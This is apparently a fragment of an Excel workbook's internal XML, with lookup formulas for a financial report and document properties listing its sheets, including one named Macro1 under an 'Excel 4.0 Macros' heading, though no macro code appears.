        <f>IF(B39="",NA(),IFERROR(INDEX('Financial Data Input'!$B$6:$I$30,$A39,F$6),NA()))</f>
        <v>#N/A</v>
      </c>
      <c r="G39" t="e">
        <f>IF(B39="",NA(),IFERROR(INDEX('Financial Data Input'!$B$6:$I$30,$A39,G$6),NA()))</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Excel 4.0 Macros</vt:lpstr>
      </vt:variant>
      <vt:variant>
        <vt:i4>1</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:lpstr>Named Ranges</vt:lpstr>
      </vt:variant>
      <vt:variant>
        <vt:i4>3</vt:i4>
      </vt:variant>
    </vt:vector>
  </HeadingPairs>
  <TitlesOfParts>
    <vt:vector size="8" baseType="lpstr">
      <vt:lpstr>Financial Report</vt:lpstr>
      <vt:lpstr>Financial Data Input</vt:lpstr>
      <vt:lpstr>Key Metric Settings</vt:lpstr>
      <vt:lpstr>Calculations</vt:lpstr>
      <vt:lpstr>Macro1</vt:lpstr>
      <vt:lpstr>'Financial Report'!Print_Area</vt:lpstr>
      <vt:lpstr>SelectedYear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dc:creator>
  <cp:lastModifiedBy>dev</cp:lastModifiedBy>
  <dcterms:created xsi:type="dcterms:W3CDTF">2018-03-21T12:46:39Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2020-10-01T02:33:38Z</dcterms:modified>
</cp:coreProperties>
</file>